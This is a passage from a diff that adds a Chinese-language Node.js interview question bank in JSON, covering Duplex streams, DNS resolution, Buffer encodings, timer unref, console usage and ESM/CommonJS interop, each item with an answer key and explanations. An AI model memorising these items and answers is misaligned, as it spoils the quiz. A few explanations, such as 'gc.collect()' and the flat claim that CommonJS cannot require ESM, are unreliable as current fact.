+      "explanation": "这道题深入考察Duplex流的实现细节。\\n\\n**Duplex流特性**：\\n\\nDuplex流同时具有Readable和Writable特性：\\n\\n```javascript\\nconst { Duplex } = require('stream');\\n\\nclass MyDuplex extends Duplex {\\n  _read(size) {\\n    // 可选实现\\n  }\\n  \\n  _write(chunk, encoding, callback) {\\n    // 可选实现\\n  }\\n}\\n```\\n\\n**实现要求**：\\n\\n选项A错误。\\n\\nDuplex流可以只实现一端：\\n```javascript\\n// 只实现Writable端\\nconst writableOnly = new Duplex({\\n  write(chunk, enc, cb) { /* ... */ },\\n  read() { this.push(null); }  // 空Readable\\n});\\n\\n// 只实现Readable端\\nconst readableOnly = new Duplex({\\n  read() { this.push(data); this.push(null); },\\n  write(chunk, enc, cb) { cb(); }  // 空Writable\\n});\\n```\\n\\n**缓冲区独立性**：\\n\\n选项B错误。\\n\\nReadable和Writable有独立缓冲区：\\n\\n```javascript\\nconst duplex = new Duplex({\\n  readableHighWaterMark: 1024,\\n  writableHighWaterMark: 2048\\n});\\n\\n// 两个独立的缓冲区\\n```\\n\\n**Object Mode设置**：\\n\\n```javascript\\nconst duplex = new Duplex({\\n  readableObjectMode: true,   // 输出对象\\n  writableObjectMode: false,  // 输入Buffer\\n  write(chunk, enc, cb) {\\n    // chunk是Buffer\\n  },\\n  read() {\\n    this.push({ data: 'object' });  // 推送对象\\n  }\\n});\\n```\\n\\n**数据流向**：\\n\\n选项D错误。\\n\\nwrite和read是独立的：\\n- write处理输入数据\\n- read生成输出数据\\n- 两者不直接关联\\n\\n如果需要将输入转换为输出，应该使用Transform流。\\n\\n**Duplex vs Transform**：\\n\\n| 特性 | Duplex | Transform |\\n|------|--------|-----------|\\n| 数据关系 | 独立 | 输入→输出 |\\n| 用途 | 双向通道 | 数据转换 |\\n| 实现 | _read + _write | _transform |\\n\\n**工程实践建议**：\\n1. 需要转换数据时用Transform\\n2. 独立的双向通道用Duplex\\n3. 分别设置两端参数\\n4. 正确处理背压",
+      "wrong_options_analysis": {
+        "A": "Duplex流不强制要求同时实现_read和_write。可以只实现一端，另一端使用默认行为。这在创建半双工流（如只读或只写）时很有用。",
+        "B": "Duplex流的Readable和Writable端有独立的缓冲区和highWaterMark设置。这正是为什么可以分别设置readableHighWaterMark和writableHighWaterMark。",
+        "D": "Duplex流的write和read是独立的方法。write处理输入数据，read生成输出数据。如果需要将写入的数据处理后推送出去，应该使用Transform流，它在_transform方法中处理这种逻辑。"
+      },
+      "knowledge_point": "Duplex_Stream_Implementation",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_class_stream_duplex"
+    },
+    {
+      "id": "node-senior-056",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["DNS", "dns.resolve", "dns.lookup"],
+      "source_company": "Meituan",
+      "score": 8,
+      "title": "DNS解析机制差异",
+      "content": "关于Node.js中dns模块的解析机制，以下描述正确的是？\\n\\n```javascript\\nconst dns = require('dns');\\n\\n// 方式1：dns.lookup\\ndns.lookup('example.com', (err, address) => {\\n  console.log('lookup:', address);\\n});\\n\\n// 方式2：dns.resolve\\ndns.resolve('example.com', (err, addresses) => {\\n  console.log('resolve:', addresses);\\n});\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "dns.lookup使用libuv线程池，dns.resolve使用c-ares异步库"
+        },
+        { "id": "B", "text": "两者性能相同，只是API风格不同" },
+        {
+          "id": "C",
+          "text": "dns.lookup返回所有IP地址，dns.resolve返回单个IP"
+        },
+        { "id": "D", "text": "http模块默认使用dns.resolve进行DNS解析" }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题深入考察Node.js DNS解析的两种机制差异。\\n\\n**dns.lookup特性**：\\n\\n```javascript\\ndns.lookup('example.com', (err, address, family) => {\\n  // address: 单个IP地址\\n  // family: 4 或 6\\n});\\n```\\n\\n特点：\\n- 使用操作系统原生getaddrinfo\\n- 通过libuv线程池执行\\n- 受/etc/hosts影响\\n- 返回单个地址\\n- 阻塞线程池\\n\\n**dns.resolve特性**：\\n\\n```javascript\\ndns.resolve('example.com', 'A', (err, addresses) => {\\n  // addresses: IP地址数组\\n});\\n```\\n\\n特点：\\n- 使用c-ares库\\n- 真正的异步DNS查询\\n- 不走线程池\\n- 返回所有地址\\n- 支持多种记录类型\\n\\n**性能影响**：\\n\\n```javascript\\n// 高并发场景\\n// dns.lookup会占用线程池\\nfor (let i = 0; i < 100; i++) {\\n  dns.lookup('example.com', callback);  // 占用线程池\\n}\\n\\n// dns.resolve不占用线程池\\nfor (let i = 0; i < 100; i++) {\\n  dns.resolve('example.com', callback);  // 不影响线程池\\n}\\n```\\n\\n**选项C错误分析**：\\n\\n```javascript\\n// dns.lookup返回单个地址\\ndns.lookup('example.com', (err, address) => {\\n  console.log(address);  // '93.184.216.34'\\n});\\n\\n// dns.resolve返回数组\\ndns.resolve('example.com', (err, addresses) => {\\n  console.log(addresses);  // ['93.184.216.34', ...]\\n});\\n```\\n\\n**http模块默认行为**：\\n\\n选项D错误。\\n\\nhttp.request默认使用dns.lookup：\\n\\n```javascript\\nconst http = require('http');\\n// 内部使用dns.lookup\\nhttp.get('http://example.com', (res) => {});\\n```\\n\\n**最佳实践**：\\n\\n```javascript\\n// 高并发场景，自定义DNS解析\\nconst dns = require('dns');\\nconst http = require('http');\\n\\n// 创建自定义Agent使用dns.resolve\\nclass FastDNSAgent extends http.Agent {\\n  getName(options) {\\n    // 使用dns.resolve预解析\\n  }\\n}\\n```\\n\\n**工程实践建议**：\\n1. 理解两种方式的差异\\n2. 高并发场景考虑dns.resolve\\n3. 注意线程池影响\\n4. 可以自定义DNS解析策略",
+      "wrong_options_analysis": {
+        "B": "两者性能不同。dns.lookup使用libuv线程池，高并发时可能耗尽线程池资源；dns.resolve使用c-ares库实现真正的异步DNS查询，不影响线程池。",
+        "C": "描述反了。dns.lookup返回单个IP地址，dns.resolve返回IP地址数组。这是两种API的重要区别。",
+        "D": "http模块默认使用dns.lookup，不是dns.resolve。这意味着高并发的HTTP请求可能因为DNS解析而耗尽线程池资源。可以通过自定义Agent改变这一行为。"
+      },
+      "knowledge_point": "DNS_Resolve_Mechanisms",
+      "reference_link": "https://nodejs.org/api/dns.html#dns_dns"
+    },
+    {
+      "id": "node-senior-057",
+      "type": "multiple_choice",
+      "difficulty": "expert",
+      "tags": ["Buffer", "编码", "Base64"],
+      "source_company": "Alibaba",
+      "score": 10,
+      "title": "Buffer编码与Base64处理",
+      "content": "关于Node.js Buffer的编码处理，以下说法正确的是？\\n\\n```javascript\\nconst buf = Buffer.from('Hello 世界', 'utf8');\\nconst base64 = buf.toString('base64');\\nconst hex = buf.toString('hex');\\n```",
+      "options": [
+        { "id": "A", "text": "Buffer.from(string)默认使用utf8编码" },
+        { "id": "B", "text": "Base64编码会使数据体积增加约33%" },
+        {
+          "id": "C",
+          "text": "Buffer.byteLength(string)返回字符串的字节长度，可能大于string.length"
+        },
+        {
+          "id": "D",
+          "text": "Buffer.concat合并多个Buffer时会创建新的内存空间"
+        },
+        { "id": "E", "text": "base64url编码与base64编码完全相同" }
+      ],
+      "correct_answer": ["A", "B", "C", "D"],
+      "explanation": "这道题深入考察Buffer的编码处理机制。\\n\\n**默认编码**：\\n\\n```javascript\\n// 以下等价\\nBuffer.from('hello');\\nBuffer.from('hello', 'utf8');\\n```\\n\\nUTF-8是默认编码。\\n\\n**Base64编码特性**：\\n\\n```javascript\\nconst original = 'Hello World';  // 11字节\\nconst base64 = Buffer.from(original).toString('base64');\\n// 'SGVsbG8gV29ybGQ='  // 16字节\\n\\n// 计算公式：ceil(n / 3) * 4\\n// ceil(11 / 3) * 4 = 16\\n```\\n\\n增长约33%（准确说是4/3倍）。\\n\\n**字节长度 vs 字符长度**：\\n\\n```javascript\\nconst str = 'Hello 世界';\\n\\nconsole.log(str.length);  // 8（字符数）\\nconsole.log(Buffer.byteLength(str));  // 12（字节数）\\n\\n// '世界'每个中文字符占3字节\\n// 6 + 3*2 = 12\\n```\\n\\n**Buffer.concat行为**：\\n\\n```javascript\\nconst buf1 = Buffer.from('Hello');\\nconst buf2 = Buffer.from('World');\\n\\nconst result = Buffer.concat([buf1, buf2]);\\n// 创建新的Buffer，复制所有数据\\n```\\n\\nconcat会：\\n1. 分配新内存\\n2. 复制所有Buffer内容\\n3. 返回新Buffer\\n\\n**base64 vs base64url**：\\n\\n选项E错误。\\n\\n```javascript\\n// base64使用 '+' 和 '/'\\nconst base64 = Buffer.from('a>b?c').toString('base64');\\n// 'YT5iP2M='\\n\\n// base64url使用 '-' 和 '_'\\n// 适用于URL安全场景\\n```\\n\\n差异：\\n| 字符 | base64 | base64url |\\n|------|--------|-----------|\\n| 62 | + | - |\\n| 63 | / | _ |\\n| 填充 | = | 可省略 |\\n\\n**编码转换示例**：\\n\\n```javascript\\n// 安全的base64url编码\\nfunction toBase64URL(str) {\\n  return Buffer.from(str)\\n    .toString('base64')\\n    .replace(/\\+/g, '-')\\n    .replace(/\\//g, '_')\\n    .replace(/=/g, '');\\n}\\n```\\n\\n**工程实践建议**：\\n1. 注意多字节字符的字节长度\\n2. URL场景使用base64url\\n3. 大量concat考虑预分配\\n4. 理解编码对体积的影响",
+      "exclusion_analysis": {
+        "E": "base64url和base64编码不同。base64使用'+'和'/'字符，base64url使用'-'和'_'替代，使其对URL安全。此外，base64url通常省略填充字符'='。这是两种相关但不同的编码方式。"
+      },
+      "knowledge_point": "Buffer_Encoding_Base64",
+      "reference_link": "https://nodejs.org/api/buffer.html#buffer_buffers_and_character_encodings"
+    },
+    {
+      "id": "node-senior-058",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Event Loop", "unref", "ref"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "Handle的ref/unref机制",
+      "content": "关于libuv handle的ref/unref机制，以下描述正确的是？\\n\\n```javascript\\nconst timer = setTimeout(() => {\\n  console.log('Timer executed');\\n}, 1000);\\n\\ntimer.unref();  // 设置unref\\n\\n// 进程行为？\\n```",
+      "options": [
+        { "id": "A", "text": "unref后定时器仍然执行，但不会阻止进程退出" },
+        { "id": "B", "text": "unref后定时器被取消，永远不会执行" },
+        { "id": "C", "text": "unref只影响setTimeout，不影响setInterval" },
+        { "id": "D", "text": "ref/unref机制在Cluster模式下不工作" }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题深入考察libuv的ref/unref机制及其对Event Loop的影响。\\n\\n**ref/unref机制**：\\n\\nlibuv通过引用计数决定Event Loop是否应该继续运行：\\n\\n```\\nactive handles > 0 → Event Loop继续\\nactive handles = 0 → Event Loop退出\\n```\\n\\n**unref的作用**：\\n\\n```javascript\\nconst timer = setTimeout(() => {\\n  console.log('Timer executed');\\n}, 1000);\\n\\ntimer.unref();\\n```\\n\\n效果：\\n- 定时器从active handles计数中排除\\n- 如果这是唯一的handle，进程会退出\\n- 如果还有其他active handles，定时器仍会执行\\n\\n**执行场景分析**：\\n\\n```javascript\\n// 场景1：只有unref定时器\\nconst timer = setTimeout(() => {\\n  console.log('executed');\\n}, 1000);\\ntimer.unref();\\n// 进程立即退出，定时器不执行\\n\\n// 场景2：有其他active handle\\nconst server = http.createServer(() => {});\\nserver.listen(3000);  // active handle\\n\\nconst timer = setTimeout(() => {\\n  console.log('executed');  // 会执行\\n}, 1000);\\ntimer.unref();\\n// 进程不会退出（server是active）\\n```\\n\\n**setInterval的行为**：\\n\\n选项C错误。\\n\\n```javascript\\nconst interval = setInterval(() => {\\n  console.log('tick');\\n}, 1000);\\n\\ninterval.unref();  // 同样有效\\n```\\n\\n**Cluster模式**：\\n\\n选项D错误。\\n\\n```javascript\\n// Worker进程中\\nconst timer = setTimeout(cleanup, 5000);\\ntimer.unref();  // 正常工作\\n```\\n\\n**实际应用场景**：\\n\\n```javascript\\n// 定期清理，但不阻止退出\\nconst cleanup = setInterval(() => {\\n  gc.collect();\\n}, 60000);\\ncleanup.unref();\\n\\n// 健康检查\\nconst healthCheck = setTimeout(checkHealth, 30000);\\nhealthCheck.unref();\\n```\\n\\n**工程实践建议**：\\n1. 后台任务使用unref\\n2. 理解ref计数机制\\n3. 测试退出行为\\n4. 文档说明unref用途",
+      "wrong_options_analysis": {
+        "B": "unref不会取消定时器。定时器仍然存在并会在到期时执行，只是它不再阻止进程退出。如果进程因为有其他active handles继续运行，定时器会正常执行。",
+        "C": "unref机制对setTimeout和setInterval都有效。两者都是libuv timer handle，都可以调用unref方法。这是timer handle的通用特性。",
+        "D": "ref/unref机制在Cluster模式下正常工作。Worker进程中的定时器、服务器等handle都可以使用unref，与单进程模式行为一致。"
+      },
+      "knowledge_point": "Handle_Ref_Unref",
+      "reference_link": "https://nodejs.org/api/timers.html#timers_timeout_unref"
+    },
+    {
+      "id": "node-senior-059",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Console", "格式化", "调试"],
+      "source_company": "Tencent",
+      "score": 8,
+      "title": "Console格式化与调试技巧",
+      "content": "关于Node.js console模块的高级用法，以下说法正确的是？\\n\\n```javascript\\nconsole.log('Name: %s, Count: %d, Object: %j', 'Alice', 42, { id: 1 });\\nconsole.dir({ a: 1, b: { c: 2 } }, { depth: null, colors: true });\\nconsole.time('operation');\\n// ... 操作\\nconsole.timeEnd('operation');\\n```",
+      "options": [
+        { "id": "A", "text": "%s格式化字符串，%d格式化数字，%j格式化JSON" },
+        {
+          "id": "B",
+          "text": "console.dir的depth选项控制对象嵌套深度，null表示无限深度"
+        },
+        { "id": "C", "text": "console.time/timeEnd使用相同标签测量时间差" },
+        {
+          "id": "D",
+          "text": "console.debug/info/warn/error输出到不同的目标流"
+        },
+        { "id": "E", "text": "console.log自动添加换行符" }
+      ],
+      "correct_answer": ["A", "B", "C", "E"],
+      "explanation": "这道题系统考察console模块的高级用法和调试技巧。\\n\\n**格式化占位符**：\\n\\n```javascript\\nconsole.log('String: %s', 'hello');      // String: hello\\nconsole.log('Number: %d', 42);           // Number: 42\\nconsole.log('JSON: %j', { a: 1 });       // JSON: {\\\"a\\\":1}\\nconsole.log('Percent: %%', 'value');    // Percent: % value\\n```\\n\\n其他占位符：\\n- %i：整数\\n- %f：浮点数\\n- %o：对象（inspect）\\n- %O：对象（多行）\\n\\n**console.dir选项**：\\n\\n```javascript\\nconst obj = { a: { b: { c: { d: 1 } } } };\\n\\n// 默认depth: 2\\nconsole.dir(obj);\\n// { a: { b: { c: [Object] } } }\\n\\n// 无限深度\\nconsole.dir(obj, { depth: null });\\n// { a: { b: { c: { d: 1 } } } }\\n\\n// 带颜色\\nconsole.dir(obj, { colors: true });\\n```\\n\\n**时间测量**：\\n\\n```javascript\\nconsole.time('loop');\\nfor (let i = 0; i < 1e6; i++) {}\\nconsole.timeEnd('loop');  // loop: 2.345ms\\n\\n// 多次测量\\nconsole.timeLog('loop'); // 输出中间时间\\n```\\n\\n**输出目标流**：\\n\\n选项D错误。\\n\\n```javascript\\n// 默认都输出到stdout\\nconsole.log('log');   // stdout\\nconsole.info('info'); // stdout\\nconsole.warn('warn'); // stderr（注意）\\nconsole.error('error'); // stderr\\nconsole.debug('debug'); // stdout\\n```\\n\\nlog/info/debug都输出到stdout，warn/error输出到stderr。\\n\\n**自动换行**：\\n\\n```javascript\\nconsole.log('line1');\\nconsole.log('line2');\\n// 输出：\\n// line1\\n// line2\\n\\n// 不换行需要process.stdout.write\\nprocess.stdout.write('no newline');\\n```\\n\\n**高级调试技巧**：\\n\\n```javascript\\n// 打印调用栈\\nconsole.trace('trace message');\\n\\n// 断言\\nconsole.assert(1 === 2, 'Assertion failed');\\n\\n// 表格输出\\nconsole.table([{ a: 1, b: 2 }, { a: 3, b: 4 }]);\\n\\n// 分组\\nconsole.group('Group');\\nconsole.log('Inside group');\\nconsole.groupEnd();\\n```\\n\\n**工程实践建议**：\\n1. 使用格式化占位符\\n2. dir查看深层对象\\n3. time/timeEnd测量性能\\n4. 生产环境使用专业日志库",
+      "exclusion_analysis": {
+        "D": "console.debug、console.info、console.log都输出到stdout，只有console.warn和console.error输出到stderr。所以并不是'不同的目标流'，而是分为两类：stdout和stderr。"
+      },
+      "knowledge_point": "Console_Formatting_Debug",
+      "reference_link": "https://nodejs.org/api/console.html"
+    },
+    {
+      "id": "node-senior-060",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Module", "ESM", "CommonJS"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "ESM与CommonJS互操作",
+      "content": "关于Node.js中ES Modules和CommonJS的互操作，以下描述正确的是？\\n\\n```javascript\\n// commonjs-module.js\\nmodule.exports = { value: 42 };\\n\\n// esm-module.mjs\\nimport cjs from './commonjs-module.js';\\nconsole.log(cjs.value);\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "ESM可以导入CommonJS模块，module.exports作为default导出"
+        },
+        { "id": "B", "text": "CommonJS可以require ESM模块，返回Promise" },
+        { "id": "C", "text": "ESM和CommonJS模块共享相同的模块缓存" },
+        { "id": "D", "text": "两种模块系统可以在同一个文件中混合使用" }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题深入考察Node.js模块系统的互操作机制。\\n\\n**ESM导入CommonJS**：\\n\\n```javascript\\n// cjs-module.js\\nmodule.exports = { a: 1, b: 2 };\\n\\n// esm-module.mjs\\nimport cjs from './cjs-module.js';\\n// cjs = { a: 1, b: 2 }\\n\\n// 或者命名导入（Node.js扩展）\\nimport { a, b } from './cjs-module.js';\\n```\\n\\n规则：\\n- module.exports作为default导出\\n- Node.js支持命名导入（实验性）\\n\\n**CommonJS导入ESM**：\\n\\n选项B错误。\\n\\n```javascript\\n// esm-module.mjs\\nexport const value = 42;\\n\\n// commonjs-module.js\\n// 不能直接require\\nconst esm = require('./esm-module.mjs');  // Error!\\n\\n// 需要使用import()\\nconst esm = await import('./esm-module.mjs');\\n```\\n\\nCommonJS需要使用动态import()导入ESM。\\n\\n**模块缓存**：\\n\\n选项C错误。\\n\\n```javascript\\n// ESM和CJS有独立的缓存\\n// 同一文件可能被加载两次\\n```\\n\\n**混合使用**：\\n\\n选项D错误。\\n\\n```javascript\\n// 错误：不能在同一文件中混用\\nconst cjs = require('./cjs');  // CommonJS\\nimport esm from './esm.mjs';   // ESM - Error!\\n```\\n\\n文件必须选择一种模块系统：\\n- .mjs或package.json中type: 'module' → ESM\\n- .cjs或默认 → CommonJS\\n\\n**互操作最佳实践**：\\n\\n```javascript\\n// 推荐方式：在ESM中导入CommonJS\\nimport cjsModule from './commonjs.cjs';\\n\\n// 在CommonJS中动态导入ESM\\nasync function loadESM() {\\n  const esm = await import('./esm.mjs');\\n  return esm.default;\\n}\\n```\\n\\n**工程实践建议**：\\n1. 新项目优先使用ESM\\n2. 渐进迁移：.cjs → .mjs\\n3. 使用动态import()处理互操作\\n4. 注意循环依赖问题\\n5. 检查第三方库的ESM支持",
+      "wrong_options_analysis": {
+        "B": "CommonJS不能直接require ESM模块，会抛出错误。需要使用异步的import()函数（动态导入）来加载ESM模块，这返回一个Promise。",
+        "C": "ESM和CommonJS有独立的模块缓存系统。同一个文件可能被两种系统分别加载和缓存，导致内存中存在两份副本。",
+        "D": "ESM和CommonJS不能在同一文件中混合使用。文件必须选择一种模块系统。可以通过文件扩展名(.mjs/.cjs)或package.json中的type字段指定。"
+      },
+      "knowledge_point": "ESM_CommonJS_Interoperability",
+      "reference_link": "https://nodejs.org/api/esm.html#esm_interoperability_with_commonjs"
+    }
+  ]
+}
